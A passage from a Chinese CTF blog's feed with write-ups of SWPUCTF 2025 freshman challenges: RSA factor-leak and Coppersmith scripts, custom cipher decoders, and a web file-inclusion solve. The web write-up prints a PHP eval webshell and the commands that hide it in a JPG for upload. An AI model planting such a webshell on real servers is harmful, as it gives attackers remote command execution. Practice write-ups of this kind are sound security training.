="</span>, r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] m2 ="</span>, m2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (Optional) recover q2 from gcd(hint3-hint4, n2)</span></span><br><span class="line">q2 = GCD(hint3 - hint4, n2)</span><br><span class="line"><span class="comment"># gcd may return q2 or q2*r (rare if (hint3-hint4) also multiple of r)</span></span><br><span class="line"><span class="keyword">if</span> q2 % r == <span class="number">0</span>:</span><br><span class="line">    q2 //= r</span><br><span class="line"><span class="keyword">assert</span> q2 != <span class="number">1</span> <span class="keyword">and</span> n2 % q2 == <span class="number">0</span>, <span class="string">"Failed to recover q2"</span></span><br><span class="line"></span><br><span class="line">p2 = n2 // (q2 * r)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] q2 ="</span>, q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"[+] p2 ="</span>, p2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====== assemble flag ======</span></span><br><span class="line">flag = m1 + m2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"\n[+] FLAG ="</span>, flag.decode(errors=<span class="string">"replace"</span>))</span><br></pre></td></tr></tbody></table></figure><p>解题思路：<br>这道题本质是利用特殊构造的模幂表达式，通过取模与 gcd 泄露 RSA 素因子或明文。第一部分中，hint2 = ((p1+e2)·q1)^{e1} mod n1，其底数在模 n1=p1q1 下等价于 e2·q1，因此整个 hint2 必然含有因子 q1，直接计算 gcd(hint2, n1) 就能恢复 q1，从而分解 n1 并用标准 RSA 解出第一段明文 m1；第二部分中，hint5 = (r²+1)^{m2} mod r³ 利用二项式展开可得 hint5 ≡ 1 + m2·r² (mod r³)，而由于结果本身小于 r³，所以 m2 = (hint5−1)/r² 可以被直接还原，同时 gcd(hint5−1, n2) 会泄露素数 r；至于 hint3 和 hint4，它们在模 q2 下的底数同余，从而使 hint3−hint4 成为 q2 的倍数，用 gcd(hint3−hint4, n2) 可分解出 q2 作为验证。整题的核心就是：精心设计的幂模形式 + 模数结构，使得 gcd 和低阶二项式展开直接泄露关键信息。</p><hr><h2 id="⭐️-16-SWPUCTF-2025-秋季新生赛-哈基米南北露躲"><a href="#⭐️-16-SWPUCTF-2025-秋季新生赛-哈基米南北露躲" class="headerlink" title="⭐️ 16 [SWPUCTF 2025 秋季新生赛]哈基米南北露躲"></a>⭐️ 16 [SWPUCTF 2025 秋季新生赛]哈基米南北露躲</h2><p>🚩flag：<code>NSSCTF{welcome_to_2025_SWPU!}</code></p><p>💡hint：<code>MISC</code></p><p>🔧tool：<code>python</code></p><p>题目：<br><img src="https://a1.boltp.com/2026/02/04/69830073d117d.png" alt="哈吉米题目"><br>扫描二维码得到key：<code>hajimi</code><br>然后再看txt</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">米米米哈基哈基哈哈哈哈哈哈基哈哈基米哈哈哈哈基哈基哈哈哈基基米哈哈米米米哈基基米哈基哈基基基米米哈米米米基哈米米米哈基基米米米哈米米基基哈基基米基基基基哈哈基哈基基哈哈哈米哈哈基基基基基基哈基哈哈基米米米哈基基基米哈米哈哈哈基基基哈基基哈哈哈米米哈基基米哈哈哈基哈米米哈基哈哈基基米哈基基基基基基基米哈哈基基米米基哈米基米哈基米米哈米哈基基哈基基基米哈基米哈哈基哈哈基哈米哈哈米基基基米基基基哈哈基基基哈米基基哈基哈米米米基哈基哈哈基哈哈米哈哈哈基哈哈米米基米哈基哈哈哈米米哈哈哈基哈基米米米哈哈基米基基哈基基基哈基基米基</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_hajiami</span>(<span class="params">encoded_str: <span class="built_in">str</span>, private_key: <span class="built_in">str</span> = <span class="string">"hajimi"</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># 三符号到三进制 digit 的映射（WP 给定）</span></span><br><span class="line">    mapping = {<span class="string">'哈'</span>: <span class="number">0</span>, <span class="string">'基'</span>: <span class="number">1</span>, <span class="string">'米'</span>: <span class="number">2</span>}</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 固定凯撒基准偏移</span></span><br><span class="line">    base_shift = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成私钥偏移数组：把 key 每个字符的 Unicode 十进制展开成数字序列</span></span><br><span class="line">    shift_array = []</span><br><span class="line">    <span class="keyword">if</span> private_key:</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> private_key:</span><br><span class="line">            shift_array.extend(<span class="built_in">int</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">ord</span>(ch)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 三种长度类型对应的数据位数（trits 数）</span></span><br><span class="line">    len_table = [<span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">    out = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    char_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">need</span>(<span class="params">n: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">if</span> pos + n &gt; <span class="built_in">len</span>(encoded_str):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f"密文不足：当前位置 <span class="subst">{pos}</span> 需要 <span class="subst">{n}</span> 个符号，但总长 <span class="subst">{<span class="built_in">len</span>(encoded_str)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(encoded_str):</span><br><span class="line">        <span class="comment"># 1) 读取 2 位随机偏移编码</span></span><br><span class="line">        need(<span class="number">2</span>)</span><br><span class="line">        a = encoded_str[pos]</span><br><span class="line">        b = encoded_str[pos + <span class="number">1</span>]</span><br><span class="line">        pos += <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> a <span class="keyword">not</span> <span class="keyword">in</span> mapping <span class="keyword">or</span> b <span class="keyword">not</span> <span class="keyword">in</span> mapping:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f"出现非法符号：<span class="subst">{a}</span><span class="subst">{b}</span> (pos=<span class="subst">{pos-<span class="number">2</span>}</span>)"</span>)</span><br><span class="line"></span><br><span class="line">        random_shift = mapping[a] * <span class="number">3</span> + mapping[b]  <span class="comment"># 0..8</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2) 读取 1 位长度标识</span></span><br><span class="line">        need(<span class="number">1</span>)</span><br><span class="line">        lc = encoded_str[pos]</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> lc <span class="keyword">not</span> <span class="keyword">in</span> mapping:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f"出现非法符号：<span class="subst">{lc}</span> (pos=<span class="subst">{pos-<span class="number">1</span>}</span>)"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 还原长度类型： (length_digit - random_shift) mod 3</span></span><br><span class="line">        length_type = (mapping[lc] - random_shift) % <span class="number">3</span></span><br><span class="line">        data_length = len_table[length_type]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) 读取数据部分</span></span><br><span class="line">        need(data_length)</span><br><span class="line">        data_code = encoded_str[pos:pos + data_length]</span><br><span class="line">        pos += data_length</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> data_code:</span><br><span class="line">            <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> mapping:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f"出现非法符号：<span class="subst">{ch}</span> (data block)"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4) 数据部分转三进制串</span></span><br><span class="line">        trits = <span class="string">''</span>.join(<span class="built_in">str</span>(mapping[ch]) <span class="keyword">for</span> ch <span class="keyword">in</span> data_code)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 5) 复原循环移位</span></span><br><span class="line">        <span class="comment"># 加密：original -&gt; 左移 random_shift 得到 trits</span></span><br><span class="line">        <span class="comment"># 解密：trits -&gt; 右移 random_shift 复原</span></span><br><span class="line">        <span class="comment"># 等价写法：original = trits[random_shift:] + trits[:random_shift]  (WP 版本)</span></span><br><span class="line">        <span class="comment"># 这里保持与 WP 一致：</span></span><br><span class="line">        original_trits = trits[random_shift:] + trits[:random_shift]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 6) 三进制 -&gt; 十进制（得到“加密态 unicode”）</span></span><br><span class="line">        enc_unicode = <span class="built_in">int</span>(original_trits, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 7) 私钥偏移（循环使用）</span></span><br><span class="line">        private_shift = shift_array[char_index % <span class="built_in">len</span>(shift_array)] <span class="keyword">if</span> shift_array <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 总偏移</span></span><br><span class="line">        total_shift = base_shift + random_shift + private_shift</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 8) 还原原始 Unicode 并转字符</span></span><br><span class="line">        orig_unicode = enc_unicode - total_shift</span><br><span class="line">        out.append(<span class="built_in">chr</span>(orig_unicode))</span><br><span class="line"></span><br><span class="line">        char_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    encoded_text = (</span><br><span class="line">        <span class="string">"米米米哈基哈基哈哈哈哈哈哈基哈哈基米哈哈哈哈基哈基哈哈哈基基米哈哈米米米哈基基米哈基哈基基基米米哈米米米基哈米米米哈基基米米米哈米米基基哈基基米基基基基哈哈基哈基基哈哈哈米哈哈基基基基基基哈基哈哈基米米米哈基基基米哈米哈哈哈基基基哈基基哈哈哈米米哈基基米哈哈哈基哈米米哈基哈哈基基米哈基基基基基基基米哈哈基基米米基哈米基米哈基米米哈米哈基基哈基基基米哈基米哈哈基哈哈基哈米哈哈米基基基米基基基哈哈基基基哈米基基哈基哈米米米基哈基哈哈基哈哈米哈哈哈基哈哈米米基米哈基哈哈哈米米哈哈哈基哈基米米米哈哈基米基基哈基基基哈基基米基"</span></span><br><span class="line">    )</span><br><span class="line">    key = <span class="string">"hajimi"</span></span><br><span class="line">    plain = decode_hajiami(encoded_text, key)</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br></pre></td></tr></tbody></table></figure><p>先把“哈/基/米”映射成三进制数 哈=0, 基=1, 米=2；密文按每个明文字符一组解析：先读 2 个符号得到 random_shift（把两位三进制转十进制 0~8），再读 1 个符号作为长度标识并用 (标识−random_shift) mod 3 还原出数据长度是 6/9/12 位之一，然后读对应数量的符号转成三进制串；由于加密时三进制串被循环左移了 random_shift，解密时把它反向复位得到原始三进制，再转成十进制得到一个“被加密过的 Unicode”；最后再减去固定偏移 base_shift=3、随机偏移 random_shift，以及由 key “hajimi” 生成的循环私钥偏移 private_shift，即可还原每个字符并拼出最终明文/flag。</p><hr><h2 id="⭐️-17-SWPUCTF-2025-秋季新生赛-哈基米南北露躲"><a href="#⭐️-17-SWPUCTF-2025-秋季新生赛-哈基米南北露躲" class="headerlink" title="⭐️ 17 [SWPUCTF 2025 秋季新生赛]哈基米南北露躲"></a>⭐️ 17 [SWPUCTF 2025 秋季新生赛]哈基米南北露躲</h2><p>🚩flag：<code>NSSCTF{Y3s_7uRe_BaseHJM}</code></p><p>💡hint：<code>REVERSE</code></p><p>🔧tool：<code>python</code> <code>DiE</code> <code>pyinstxtractor</code> <code>uncompyle6</code></p><p>python打包成的exe，工具pyinstxtractor + uncompyle6 / decompyle3</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">CHARS = <span class="string">"哈基米南北绿豆阿西噶压库那鲁曼波欧马自立悠嗒步诺斯哇嗷冰踩背叮咚鸡大狗叫袋鼠兴奋剂出示健康码楼上下来带一段小白手套胖宝牛魔呵嘿喔"</span></span><br><span class="line">random.seed(<span class="number">777</span>)</span><br><span class="line">a = random.sample(<span class="built_in">range</span>(<span class="number">64</span>), <span class="number">64</span>)</span><br><span class="line">CHARS1 = <span class="string">""</span>.join((CHARS[a.index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)))</span><br><span class="line">CHARS = CHARS1</span><br><span class="line">CHAR_TO_INDEX = {char: idx <span class="keyword">for</span> idx, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(CHARS)}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    encoded = <span class="string">"叮鼠背叮康豆绿步叫豆北哇基豆喔袋哈阿牛鼠南健牛出基来阿鸡马北豆库"</span></span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded:</span><br><span class="line">        targetIndex = CHAR_TO_INDEX[char]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">            i=<span class="built_in">str</span>(i)</span><br><span class="line">            index = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"A"</span> &lt;= i &lt;= <span class="string">"Z"</span>:</span><br><span class="line">                index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">"A"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"a"</span> &lt;= i &lt;= <span class="string">"z"</span>:</span><br><span class="line">                    index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">"a"</span>) + <span class="number">26</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"0"</span> &lt;= i &lt;= <span class="string">"9"</span>:</span><br><span class="line">                        index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">"0"</span>) + <span class="number">52</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> i == <span class="string">"+"</span>:</span><br><span class="line">                            index = <span class="number">62</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> i == <span class="string">"/"</span>:</span><br><span class="line">                                index = <span class="number">63</span></span><br><span class="line">            <span class="keyword">if</span> index == targetIndex:</span><br><span class="line">                result+=i</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p>运行完成后用base64解码。</p><hr><p>以我推的美图草草收尾这个系列的题目，做了大概一半的。今天再修修前面5篇的目录。<br><img src="https://a1.boltp.com/2026/02/01/697f230347e53.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SWPUCTF2025秋季新生赛4</title>
      <link href="/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/"/>
      <url>/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/</url>
      
        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年2月3日</em></p><p><em>练习数量：1</em></p><p>上篇：<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>下篇：<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a><br>5️⃣<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><hr><h2 id="⭐️-13-SWPUCTF-2025-秋季新生赛-ezez-include"><a href="#⭐️-13-SWPUCTF-2025-秋季新生赛-ezez-include" class="headerlink" title="⭐️ 13 [SWPUCTF 2025 秋季新生赛]ezez_include"></a>⭐️ 13 [SWPUCTF 2025 秋季新生赛]ezez_include</h2><p>🚩flag：<code>NSSCTF{0bcf4985-3ef7-4664-9e7a-b864ee217ce2}</code></p><p>💡hint：<code>WEB</code> <code>文件上传</code> <code>文件包含</code> <code>目录扫描</code></p><p>🔧tool：<code>antsword</code> <code>dirsearch</code></p><blockquote><p>文件包含漏洞LFI：应用程序在未对用户可控输入进行严格校验的情况下，将其用于文件包含操作，导致攻击者能够读取或执行服务器上的本地文件的安全漏洞。</p></blockquote><p>目录扫描工具dirsearch的下载：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>基本使用方法（示例）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://node1.anna.nssctf.cn:20739</span><br></pre></td></tr></tbody></table></figure><p>扫描结果：<br><img src="https://a1.boltp.com/2026/02/03/6982117d58202.png" alt="目录扫描结果"><br>访问/upload.php/<br><img src="https://a1.boltp.com/2026/02/03/698211c4a44c8.png" alt="访问结果"></p><p>制作一句话图片马方法：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后找到一张图片<code>tp.jpg</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">copy tp.jpg/b+muma.php shell.jpg</span><br></pre></td></tr></tbody></table></figure><p>在linux系统中的命令是：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> tp.jpg muma.php &gt; shell.jpg</span><br></pre></td></tr></tbody></table></figure><p>制作出的shell图片：<br><img src="https://a1.boltp.com/2026/02/03/69821737b3d45.jpg" alt="制作出的shell图片"><br>上传成功：<br><img src="https://a1.boltp.com/2026/02/03/698217294cfb1.png" alt="shell.jpg上传成功"><br>后续其实用的是muma.jpg（直接改了后缀）<br><img src="https://a1.boltp.com/2026/02/03/69821909d4bb9.png"><br>在index.php界面读取upload/{你上传的文件}.jpg<br>发现确实以php格式运行<br>访问完成后，可以用蚁剑。<br>具体配置如下：<br><img src="https://a1.boltp.com/2026/02/03/698219b0d4e70.png"><br><img src="https://a1.boltp.com/2026/02/03/698219e0f0a93.png"><br>最后在根目录找到了flag：<br><img src="https://a1.boltp.com/2026/02/03/69821a6bf325d.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SWPUCTF2025秋季新生赛3</title>
      <link href="/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/"/>
      <url>/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/</url>
      
        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年2月2日</em></p><p><em>练习数量：5</em></p><p>上篇：<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>下篇：<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a><br>5️⃣<a href="https://sereniusx.github.io/2026/02/04/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B5/">CTF-SWPUCTF2025秋季新生赛5</a></p><h2 id="⭐️-08-SWPUCTF-2025-秋季新生赛-babyleak"><a href="#⭐️-08-SWPUCTF-2025-秋季新生赛-babyleak" class="headerlink" title="⭐️ 08 [SWPUCTF 2025 秋季新生赛]babyleak"></a>⭐️ 08 [SWPUCTF 2025 秋季新生赛]babyleak</h2><p>🚩flag：<code>NSSCTF{1t_1S_R3al1y_Simpl3}</code></p><p>💡hint：<code>CRYPTO</code> <code>RSA</code></p><p>🔧tool：<code>sagemath</code></p><p>典型的 RSA 因子泄露（泄露了 p 的高位） 题。<br>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse, GCD</span><br><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fpylll <span class="keyword">import</span> IntegerMatrix, LLL</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== given =====================</span></span><br><span class="line">c = <span class="number">83677258507096298448838473157410968562663844066692785784795808568831104839808973945430904217176612281847780586315531356996541690190721036805002490234088269244928701049252093198328154082985532165306398300581341772147191549267469846165106567529323633427454813950145233569952080565179636978713867195303589950560</span></span><br><span class="line">N = <span class="number">99731820183974258509491930788425315687997383070140288617931730219025238256184394629749310800530369706494739983435809537993544901646755147227424129804516752136774736421075294396109951803322879567801060761407401694794176564353979061285525272805898515319706858347858066368622209147353721655141025433249553782243</span></span><br><span class="line">phigh = <span class="number">206878744347352036226523952451410430637894370598850007775437213854137659947239582113486</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== coppersmith (univariate) =====================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coppersmith_univariate_linear</span>(<span class="params">p0: <span class="built_in">int</span>, N: <span class="built_in">int</span>, X: <span class="built_in">int</span>, m: <span class="built_in">int</span> = <span class="number">4</span>, t: <span class="built_in">int</span> = <span class="number">4</span></span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Solve f(x)=p0+x has a small root x0 &lt; X modulo an unknown factor of N (p ~ N^0.5).</span></span><br><span class="line"><span class="string">    Classic Howgrave-Graham style lattice.</span></span><br><span class="line"><span class="string">    For this challenge it works well with m=4,t=4 (you can tweak).</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    x = sp.Symbol(<span class="string">"x"</span>)</span><br><span class="line">    f = sp.Poly(p0 + x, x)</span><br><span class="line">    d = f.degree()</span><br><span class="line">    <span class="keyword">assert</span> d == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build polynomials:</span></span><br><span class="line">    <span class="comment"># g_i(x) = f(x)^i * N^(m-i) for i=0..m-1</span></span><br><span class="line">    <span class="comment"># h_j(x) = x^j * f(x)^m      for j=0..t-1</span></span><br><span class="line">    polys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        polys.append((f**i) * (N**(m - i)))</span><br><span class="line">    fm = f**m</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        polys.append(fm * sp.Poly(x**j, x))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># max degree = m + t - 1 (since d=1)</span></span><br><span class="line">    max_deg = m + t - <span class="number">1</span></span><br><span class="line">    dim = m + t</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Lattice basis matrix (dim x (max_deg+1))</span></span><br><span class="line">    <span class="comment"># Each coefficient of x^k is scaled by X^k</span></span><br><span class="line">    M = IntegerMatrix(dim, max_deg + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> row, poly <span class="keyword">in</span> <span class="built_in">enumerate</span>(polys):</span><br><span class="line">        poly = sp.Poly(poly, x)</span><br><span class="line">        <span class="keyword">for</span> (k,), coeff <span class="keyword">in</span> poly.terms():</span><br><span class="line">            <span class="keyword">if</span> k &lt;= max_deg:</span><br><span class="line">                M[row, k] = <span class="built_in">int</span>(coeff) * (X**k)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL reduce</span></span><br><span class="line">    M_red = LLL.reduction(M)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take the first reduced vector -&gt; build integer polynomial H(x)</span></span><br><span class="line">    v0 = [<span class="built_in">int</span>(M_red[<span class="number">0</span>, j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(max_deg + <span class="number">1</span>)]</span><br><span class="line">    H_coeff = [v0[k] // (X**k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(max_deg + <span class="number">1</span>)]</span><br><span class="line">    H = sp.Poly(<span class="built_in">sum</span>(sp.Integer(H_coeff[k]) * x**k <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(max_deg + <span class="number">1</span>)), x)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find integer roots of H (degree small, factor is fine)</span></span><br><span class="line">    roots = []</span><br><span class="line">    cont, facs = H.factor_list()</span><br><span class="line">    <span class="keyword">for</span> fac, exp <span class="keyword">in</span> facs:</span><br><span class="line">        <span class="keyword">if</span> fac.degree() == <span class="number">1</span>:</span><br><span class="line">            a, b = fac.all_coeffs()  <span class="comment"># a*x + b</span></span><br><span class="line">            a, b = <span class="built_in">int</span>(a), <span class="built_in">int</span>(b)</span><br><span class="line">            <span class="keyword">if</span> a != <span class="number">0</span> <span class="keyword">and</span> (-b) % a == <span class="number">0</span>:</span><br><span class="line">                r = (-b) // a</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt;= r &lt; X:</span><br><span class="line">                    roots.append(r)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If not found via linear factors, fallback: brute check any integer roots returned by sympy</span></span><br><span class="line">    <span class="comment"># (Usually not needed for this kind of linear-leak RSA)</span></span><br><span class="line">    roots = <span class="built_in">sorted</span>(<span class="built_in">set</span>(roots))</span><br><span class="line">    <span class="keyword">return</span> roots, H</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    k = <span class="number">225</span></span><br><span class="line">    X = <span class="number">1</span> &lt;&lt; k</span><br><span class="line">    p0 = phigh &lt;&lt; k</span><br><span class="line"></span><br><span class="line">    roots, H = coppersmith_univariate_linear(p0, N, X, m=<span class="number">4</span>, t=<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> roots:</span><br><span class="line">        <span class="comment"># try a couple of parameter tweaks if needed</span></span><br><span class="line">        <span class="keyword">for</span> (m, t) <span class="keyword">in</span> [(<span class="number">5</span>, <span class="number">5</span>), (<span class="number">6</span>, <span class="number">6</span>), (<span class="number">6</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">6</span>)]:</span><br><span class="line">            roots, H = coppersmith_univariate_linear(p0, N, X, m=m, t=t)</span><br><span class="line">            <span class="keyword">if</span> roots:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> roots:</span><br><span class="line">        <span 